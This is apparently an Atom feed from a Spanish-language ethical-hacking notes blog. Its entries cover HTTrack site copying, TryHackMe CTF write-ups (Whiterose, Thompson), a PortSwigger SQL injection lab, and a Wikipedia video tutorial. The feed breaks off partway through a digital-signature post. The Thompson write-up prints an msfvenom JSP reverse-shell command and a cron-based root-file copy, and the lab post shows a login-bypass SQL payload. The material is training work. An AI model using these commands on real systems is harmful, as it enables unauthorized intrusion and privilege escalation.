<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="es"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://sefamol.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://sefamol.github.io/" rel="alternate" type="text/html" hreflang="es"/><updated>2025-04-16T02:49:45+00:00</updated><id>https://sefamol.github.io/feed.xml</id><title type="html">Mis apuntes de Ethical Hacking y más</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Copia de código fuente de una web con Httrack</title><link href="https://sefamol.github.io/blog/2025/Copiar-sitios-web-con-httrack/" rel="alternate" type="text/html" title="Copia de código fuente de una web con Httrack"/><published>2025-04-15T10:00:00+00:00</published><updated>2025-04-15T10:00:00+00:00</updated><id>https://sefamol.github.io/blog/2025/Copiar%20sitios%20web%20con%20httrack</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/Copiar-sitios-web-con-httrack/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Software</strong>: HTTRACK</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Duracion</strong>: 10 minutos</li> <li><strong>Observaciones</strong>: Herramienta eficiente para la copia de páginas web, en caso de que la página contenga demasiada información no obtiene una información completa.</li> </ul> <h2 id="descarga-e-instalación"><strong>Descarga e instalación</strong></h2> <p>Para equipos con SO <strong>Windows</strong> descargar el archivo ejecutable de <a href="https://www.httrack.com/">https://www.httrack.com/</a> Para equipos con SO Linux/Ubuntu instalamos el paquete desde el repositorio apt</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt update &amp;&amp; sudo apt install httrack -y
</code></pre></div></div> <p>En caso de que se pida instalar Las firmas siguientes porque la clave pública no está disponible de <strong>NO_PUBKEY 0E98404D386FA1D9 NO_PUBKEY 6ED0E7B82643E131</strong> Utilizamos el siguiente comando para instalar las claves publicas</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 0E98404D386FA1D9 6ED0E7B82643E131
</code></pre></div></div> <p>Y continuamos con la intalación normal</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install httrack -y
</code></pre></div></div> <h2 id="copiando-la-web"><strong>Copiando la web</strong></h2> <p>Una vez instalado el paquete, descargamos la web completa utilizando el comando</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httrack http://test.website.com -O./website_clone -F "Mozilla/5.0" r5 -%h -v
</code></pre></div></div> <p><strong>Donde:</strong></p> <ul> <li><strong>-F “Mozilla/5.0”</strong> Finge ser un navegador.</li> <li><strong>-r5</strong> Profundidad de descarga (ej: 5 niveles).</li> <li><strong>%h</strong> Respeta la estructura de directorios del sitio.</li> </ul> <p>Luego podemos utilizar nuestro editor de código preferido y realizar el análisis deseado.</p>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="Copia,"/><category term="HTTRACK,"/><category term="Herramientas,"/><category term="ciberseguridad,"/><category term="pentesting"/><category term="web"/><summary type="html"><![CDATA[Copiar código fuente de una página web con HTTRACK]]></summary></entry><entry><title type="html">Whiterose</title><link href="https://sefamol.github.io/blog/2025/ctf-whiterose/" rel="alternate" type="text/html" title="Whiterose"/><published>2025-02-17T17:00:00+00:00</published><updated>2025-02-17T17:00:00+00:00</updated><id>https://sefamol.github.io/blog/2025/ctf-whiterose</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/ctf-whiterose/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>URL</strong>: https://tryhackme.com/room/whiterose</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Flags</strong>: Usuario y Root</li> <li><strong>Aprendizaje</strong>: acceso a información no autorizada mediante <strong>IDOR</strong>, inyección de plantillas del lado del servidor <strong>SSTI</strong> y escalamiento de privilegios mediante abuso de permisos de administrador en aplicaciones.</li> </ul> <h1 id="conocimientos-iniciales"><strong>Conocimientos iniciales</strong></h1> <h3 id="idor">IDOR</h3> <p>Un IDOR es una vulnerabilidad que ocurre debido a errores en la implementación de controles de acceso.Permite a un atacante acceder a información o recursos dentro de la aplicación que no deberían ser accesibles para su nivel de privilegios.</p> <p>Información ampliada en el siguiente enlace: <a href="https://portswigger.net/web-security/access-control/idor" target="_blank">Portswigger - IDOR</a></p> <h3 id="ssti">SSTI</h3> <p>La Inyección de Plantillas del Lado del Servidor (SSTI) es una vulnerabilidad de seguridad que ocurre cuando una aplicación web procesa entradas de usuario de manera insegura dentro de un motor de plantillas. Esto sucede cuando las entradas del usuario se concatenan directamente en una plantilla sin la debida sanitización o validación. Una aplicación vulnerable a SSTI puede permitir la ejecución remota de código (RCE), la filtración de datos sensibles o la escalada de privilegios en el servidor, lo que representa un riesgo crítico para la seguridad del sistema.</p> <p>Información ampliada en el siguiente enlace: <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank">Portswigger - SSTI</a></p> <h3 id="abuso-de-privilegio-root-con-sudoedit">abuso de privilegio root con sudoedit</h3> <p>La vulnerabilidad de abuso de privilegios con sudoedit se refiere a una mala configuración en sudo que permite a un usuario editar archivos con privilegios de root sin necesidad de autenticación. Esto ocurre cuando un usuario tiene permisos para ejecutar sudoedit sobre archivos sensibles, lo que puede llevar a una escalada de privilegios.</p> <h1 id="el-ctf"><strong>El CTF</strong></h1> <h3 id="preparación">Preparación</h3> <p>Antes de iniciar, es necesario agregar un dominio a la ip otorgada por tryhackme para desplegar la web. Esto se realiza añadiendo la url del endpoint al archivo <strong>/etc/hosts</strong>. Como se ve en la imagen.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-whiterose-01-480.webp 480w,/assets/img/ctf-whiterose-01-800.webp 800w,/assets/img/ctf-whiterose-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-whiterose-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="ctf"/><category term="pentesting"/><category term="idor"/><category term="template"/><category term="injection"/><category term="revshell"/><category term="payload"/><category term="sudoedit"/><summary type="html"><![CDATA[CTF sencillo con escalamiento a nivel root]]></summary></entry><entry><title type="html">Wikipedia - Conversión y almacenamiento de videos en formato webm</title><link href="https://sefamol.github.io/blog/2025/wikipedia-host-imagenes-webm/" rel="alternate" type="text/html" title="Wikipedia - Conversión y almacenamiento de videos en formato webm"/><published>2025-02-12T21:20:00+00:00</published><updated>2025-02-12T21:20:00+00:00</updated><id>https://sefamol.github.io/blog/2025/wikipedia-host-imagenes-webm</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/wikipedia-host-imagenes-webm/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Plataforma</strong>: Wikipedia, Wikimedia</li> <li><strong>Dificultad</strong>: Baja</li> <li><strong>Duracion</strong>: 10 minutos</li> <li><strong>Observaciones</strong>: Wikipedia solo permite almacenamiento de videos en formato webm por ello la importancia de este documento</li> </ul> <hr/> <h1 id="un-poco-de-teoría"><strong>Un poco de teoría</strong></h1> <h2 id="qué-es-el-formato-webm"><strong>Qué es el formato webm?</strong></h2> <p>El formato webm (codec vp8 y vp9), es un formato optimizado para la web. Es una alternativa al codec h264 (mp4) siendo su principal característica su uso libre de regalías.</p> <p>Más teoría en: <a href="https://es.wikipedia.org/wiki/WebM">https://es.wikipedia.org/wiki/WebM</a> y <a href="https://www.arsys.es/blog/webm-video-pagina-web">https://www.arsys.es/blog/webm-video-pagina-web</a></p> <h1 id="vamos-a-la-práctica"><strong>Vamos a la práctica</strong></h1> <h2 id="si-editas-con-la-suite-de-adobe">Si editas con la suite de adobe</h2> <p>La solución es sencilla instalando o agregando el preset para exportar en formato webm</p> <ul> <li> <ol> <li>Descargamos el preset de <a href="https://fnord.com/">https://fnord.com/</a></li> </ol> </li> <li> <ol> <li>instalamos el paquete o copiamos el contenido de la carpeta <strong>5765624D_5765624D</strong> a <strong>/Applications/Adobe Media Encoder CC 2014/Adobe Media Encoder CC 2014.app/MediaIO/systempresets/5765624D_5765624D</strong> (sigue las instrucciones en Presets.txt del archivo descagado)</li> </ol> </li> <li> <ol> <li>Verifica que es posible exportar en formato webm</li> </ol> </li> </ul> <h2 id="si-es-necesario-convertir-de-cualquier-formato-a-webm"><strong>Si es necesario convertir de cualquier formato a webm</strong></h2> <p>Probé software instalado en windows y paginas web de conversión. Ambos reducen la calidad del video convertido</p> <h3 id="utilizando-video2commons-la-herramienta-de-wikimedia"><strong>Utilizando video2commons, la herramienta de wikimedia</strong></h3> <p>Esta herramienta permite la creación del archivo y simultaneamente agrega el video a la galeria de videos de wikimedia.</p> <h4 id="ventajas">Ventajas</h4> <ul> <li>Es una herramienta en línea y soporta videos de hasta 2 gb</li> <li>El codigo de la herramienta se encuentra en <a href="https://github.com/toolforge/video2commons">https://github.com/toolforge/video2commons</a></li> <li>Mantiene la calidad de video y lo prepara directamente para su uso <h4 id="desventajas">Desventajas</h4> </li> <li>Si es para un proyecto independiente no es posible eliminar el video, pero se puede pedir la eliminación a los administradores.</li> </ul> <h3 id="agregando-el-video-a-video2commons">Agregando el video a video2commons</h3> <ul> <li>Ingresamos a wikimedia e iniciamos sesión</li> <li>Ingresamos a <a href="https://video2commons.toolforge.org/">https://video2commons.toolforge.org/</a></li> <li>Seleccionamos el archivo a ser convertido y hacemos click en next</li> <li>Subimos el archivo</li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/webm_imagen_07es-480.webp 480w,/assets/img/webm_imagen_07es-800.webp 800w,/assets/img/webm_imagen_07es-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/webm_imagen_07es.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li>Agregamos un título al video (no se admiten caracteres especiales ni acentos)</li> <li>Esperamos a que termine de subir y convertir el video</li> </ul> <h3 id="agregando-la-licencia-y-descripción">Agregando la licencia y descripción</h3> <p>Una vez almacenado el video se generará la entrada del video, la cúal hay q configurar de la siguiente manera:</p> <ul> <li>Ingresando al enlace generado veremos que no existen datos acerca del video</li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/webm_imagen_01es-480.webp 480w,/assets/img/webm_imagen_01es-800.webp 800w,/assets/img/webm_imagen_01es-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/webm_imagen_01es.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li>Hacemos click en el boton <strong>edit</strong> a lado del título Summary y se desplegará la siguiente ventana</li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/webm_imagen_02es-480.webp 480w,/assets/img/webm_imagen_02es-800.webp 800w,/assets/img/webm_imagen_02es-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/webm_imagen_02es.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li>Editamos los campos con los datos que tengamos a disposición, la vista prevía mostrará los cambios. Una vez llenado el formulario hacemos click en <strong>publish changes</strong></li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/webm_imagen_03es-480.webp 480w,/assets/img/webm_imagen_03es-800.webp 800w,/assets/img/webm_imagen_03es-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/webm_imagen_03es.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li>Agregamos la licencia, generalmente se usa CC BY-SA 4.0. Haciendo click en el boton edit a lado del título Licensing.</li> </ul> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/webm_imagen_04es-480.webp 480w,/assets/img/webm_imagen_04es-800.webp 800w,/assets/img/webm_imagen_04es-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/webm_imagen_04es.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <ul> <li>Si deseamos agregamos categorias y etiquetas Por comodidad realice este procedimiento en la página en ingles, pero es posible cambiar el idioma y realizar los mismos pasos en el idioma español. &lt;/n&gt;</li> </ul> <p>Es todo por esta entrada, <strong>Buen edit¡¡</strong></p>]]></content><author><name></name></author><category term="wikipedia"/><category term="wikipedia,"/><category term="wikimedia,"/><category term="webm"/><summary type="html"><![CDATA[Tutorial para almacenar videos en Wikimedia en formato webm]]></summary></entry><entry><title type="html">Burpsuite - SQL injection vulnerability allowing login bypass</title><link href="https://sefamol.github.io/blog/2025/Burpsuite-SQL-injection-vulnerability-allowing-login-bypass/" rel="alternate" type="text/html" title="Burpsuite - SQL injection vulnerability allowing login bypass"/><published>2025-01-06T22:30:00+00:00</published><updated>2025-01-06T22:30:00+00:00</updated><id>https://sefamol.github.io/blog/2025/Burpsuite%20-%20SQL%20injection%20vulnerability%20allowing%20login%20bypass</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/Burpsuite-SQL-injection-vulnerability-allowing-login-bypass/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Software</strong>: Burpsuite Community</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Duracion</strong>: 5 minutos</li> <li><strong>Observaciones</strong>: Se realizo una inyección SQL simple al login de la aplicación</li> <li><strong>CVSS 3.1</strong>: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H <strong>9.8 Crítico</strong></li> </ul> <h2 id="reconocimiento"><strong>Reconocimiento</strong></h2> <ul> <li>Dada la naturaleza del laboratorio se presento un solo endpoint, el <strong>login</strong> de la aplciación</li> </ul> <hr/> <h2 id="explicación-de-la-vulnerabilidad"><strong>Explicación de la vulnerabilidad</strong></h2> <p>La vulnerabilidad afecta a una base de datos que no tiene consultas parametrizadas y/o no esta sanitizada, lo que permite la inyección de código en una petición.</p> <p>Una consulta esperada a la base de datos tiene la siguiente forma:<br/></p> <p><code class="language-plaintext highlighter-rouge">...academy.net/filter?category=Corporate+gifts</code></p> <p>Y en la Base de Datos se ve de la siguiente manera:</p> <p><code class="language-plaintext highlighter-rouge">SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code> <br/></p> <p>en este sentido realizar la prueba de inyección SQL utilizando la prueba clasica <strong>’ –</strong> donde:</p> <ul> <li><strong>‘</strong>: Se utiliza para terminar el valor esperado del campo category.</li> <li><strong>–</strong>: Ingresa comentario</li> </ul> <hr/> <h2 id="solución-del-laboratorio"><strong>Solución del laboratorio</strong></h2> <p>La página de login presenta 2 campos de input para validar los datos de usuario <strong>username</strong> y <strong>pasword</strong></p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/burpsuite-bypass-login101-480.webp 480w,/assets/img/burpsuite-bypass-login101-800.webp 800w,/assets/img/burpsuite-bypass-login101-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/burpsuite-bypass-login101.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Probamos realizar la inyección simple <code class="language-plaintext highlighter-rouge">' --</code> en el campo username</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/burpsuite-bypass-login102-480.webp 480w,/assets/img/burpsuite-bypass-login102-800.webp 800w,/assets/img/burpsuite-bypass-login102-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/burpsuite-bypass-login102.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Dando como resultado la solución del laboratorio</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/burpsuite-bypass-login103-480.webp 480w,/assets/img/burpsuite-bypass-login103-800.webp 800w,/assets/img/burpsuite-bypass-login103-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/burpsuite-bypass-login103.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="mitigación"><strong>Mitigación</strong></h2> <ul> <li> <p><strong>Realizar consultas parametrizadas</strong> Evitar la concatenación de entradas de usuario en las consultas.</p> </li> <li> <p><strong>Validación de entradas</strong> Asegurar que las entradas de usuario sean saneadas y validadas antes de procesarlas.</p> </li> </ul> <p><strong>URL del laboratorio:</strong> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data</p>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="Burpsuite,"/><category term="Portswigger,"/><category term="pentesting,"/><category term="ciberseguridad,"/><category term="Web,"/><category term="Inyección"/><category term="SQL"/><summary type="html"><![CDATA[Laboratorio introductorio a inyección SQL]]></summary></entry><entry><title type="html">Thompson</title><link href="https://sefamol.github.io/blog/2025/ctf-thompson/" rel="alternate" type="text/html" title="Thompson"/><published>2025-01-03T21:00:00+00:00</published><updated>2025-01-03T21:00:00+00:00</updated><id>https://sefamol.github.io/blog/2025/ctf-thompson</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/ctf-thompson/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>URL</strong>: https://tryhackme.com/r/room/bsidesgtthompson</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Flags</strong>: Usuario y Root</li> <li><strong>Aprendizaje</strong>: Explotación con metasploit, crontab</li> </ul> <h1 id="conocimientos-iniciales"><strong>Conocimientos iniciales</strong></h1> <h3 id="apache-tomcat-y-archivos-war">Apache Tomcat y archivos .war</h3> <p>Las versiones anteriores a 6.024/5.5.29 de tomcat son vulnerables a directory transversal, lo que permite ejecutar un payload desde metasploit, entre otras técnicas de explotación.</p> <p>Información ampliada en el siguiente enlace: <a href=" https://www.tenable.com/plugins/nessus/44314" target="_blank">Apache Tomcat WAR Multiple Vulnerabilities</a></p> <h3 id="crontab">crontab</h3> <p>Crontab ejecuta tareas automatizadas en segundo plano, desde una lista alojada en <strong>etc/crontab</strong> o en otra ubicación determinada por el administrador.</p> <p>Información ampliada en el siguiente enlace: <a href="https://www.hackingarticles.in/crontab-command/" target="_blank">Crontab</a></p> <h1 id="el-ctf"><strong>El CTF</strong></h1> <h3 id="reconocimiento">Reconocimiento</h3> <p>Al iniciar el proceso de <strong>reconocimiento</strong> es común realizar la enumeración de puertos, el scaneo de directorios y de subdominios, entre otras pruebas según presente la aplicación web obejtivo. En el caso de este ctf se obtuvo resultados de ínteres mediante el scaneo de puertos. La herramienta utilizada para ello fue nmap. El resultado muestra que el puerto 8080 se encuentra habilitado para desplegar el servicio <strong>Apache Tomcat</strong></p> <p>Ingresando por el puerto 8080 se observa que se despliega un menu de inicio de sesión, el cual al oprimir en <strong>cancel</strong> despliega una pagina de <strong>error</strong> con información importante.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-01-480.webp 480w,/assets/img/ctf-thompson-01-800.webp 800w,/assets/img/ctf-thompson-01-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-01.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-02-480.webp 480w,/assets/img/ctf-thompson-02-800.webp 800w,/assets/img/ctf-thompson-02-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-02.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> Inicio de sesión </div> <h2 id="primera-flag">Primera Flag</h2> <p>Realizando el login con las credenciales obtenidas en la página de error accedemos al siguiente panel</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-03-480.webp 480w,/assets/img/ctf-thompson-03-800.webp 800w,/assets/img/ctf-thompson-03-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-03.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>La página permite “subir” e implementar archivos .war en el servidor</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-04-480.webp 480w,/assets/img/ctf-thompson-04-800.webp 800w,/assets/img/ctf-thompson-04-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-04.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Como se expuso al inicio de este tutorial, es posible realizar un ataque de tipo directory transversal mediante el uso de archivos war. Para ello necesitaremos <strong>msfvenom</strong> para generar el payload. Como podemos ver a continuación</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war &gt; reverse.war
</code></pre></div></div> <p>Se puede obtener el payload desde: <code class="language-plaintext highlighter-rouge">https://book.hacktricks.wiki/es/generic-hacking/reverse-shells/msfvenom.html?highlight=war#war</code></p> <p>Generamos el payload y ponemos un servidor en escucha en el puerto 4444</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-07-480.webp 480w,/assets/img/ctf-thompson-07-800.webp 800w,/assets/img/ctf-thompson-07-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-07.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Una vez subido el archivo reverse_shell.war ejecutamos el payload desde el panel de administración</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-08-480.webp 480w,/assets/img/ctf-thompson-08-800.webp 800w,/assets/img/ctf-thompson-08-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-08.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Observamos que fue posible la conexión a través del payload. A continuación realizamos la búsqueda de la flag en los archivos del servidor.</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-09-480.webp 480w,/assets/img/ctf-thompson-09-800.webp 800w,/assets/img/ctf-thompson-09-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-09.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div> <h2 id="escalamiento-de-privilegios">Escalamiento de privilegios</h2> <h3 id="flag-de-root">Flag de root</h3> <p>Notamos que el archivo <strong>id.sh</strong> se encuentra enlazado al archivo <strong>test.txt</strong>, es posible que se ejecute mediante crontab</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-10-480.webp 480w,/assets/img/ctf-thompson-10-800.webp 800w,/assets/img/ctf-thompson-10-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-11-480.webp 480w,/assets/img/ctf-thompson-11-800.webp 800w,/assets/img/ctf-thompson-11-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Utilizamos el comando <strong>echo</strong> para copiar</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 'cp /root/root.txt /home/jack/root.txt' &gt; id.sh
</code></pre></div></div> <p>Al ejecutarse este comando, se copiará el archivo root.txt ubicado en el directorio /root/ al directorio /home/jack/.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-13-480.webp 480w,/assets/img/ctf-thompson-13-800.webp 800w,/assets/img/ctf-thompson-13-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-14-480.webp 480w,/assets/img/ctf-thompson-14-800.webp 800w,/assets/img/ctf-thompson-14-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Esperamos un momento a que se ejecute la tarea en crontab, y accedemos root.txt obteniendo la segunda flag</p> <div class="row mt-3 justify-content-center"> <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0"> <div class="img-container"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ctf-thompson-12-480.webp 480w,/assets/img/ctf-thompson-12-800.webp 800w,/assets/img/ctf-thompson-12-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ctf-thompson-12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> </div>]]></content><author><name></name></author><category term="Seguridad"/><category term="Informática"/><category term="ctf"/><category term="pentesting"/><category term="msfvenom"/><category term="web_application_archive"/><category term=".war"/><category term="apache"/><category term="tomcat"/><category term="directory_transversal"/><summary type="html"><![CDATA[CTF sencillo con escalamiento a nivel root]]></summary></entry><entry><title type="html">Creación y verificación de una firma dígital</title><link href="https://sefamol.github.io/blog/2025/Creacion-y-verificacion-firma-digital/" rel="alternate" type="text/html" title="Creación y verificación de una firma dígital"/><published>2025-01-03T10:20:00+00:00</published><updated>2025-01-03T10:20:00+00:00</updated><id>https://sefamol.github.io/blog/2025/Creacion-y-verificacion-firma-digital</id><content type="html" xml:base="https://sefamol.github.io/blog/2025/Creacion-y-verificacion-firma-digital/"><![CDATA[<h1 id="datos-generales"><strong>Datos Generales</strong></h1> <ul> <li><strong>Software</strong>: openssl</li> <li><strong>Dificultad</strong>: Fácil</li> <li><strong>Duracion</strong>: 10 minutos</li> <li><strong>Observaciones</strong>: Laboratorio fácil para la implementación de una firma dígital</li> </ul> <h2 id="creación-de-clave-privada"><strong>Creación de clave privada</strong></h2> <p>Para la creación de una llave pública el primer paso es la creación de una llave privada, para ello se ejecuta el siguiente comando:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre 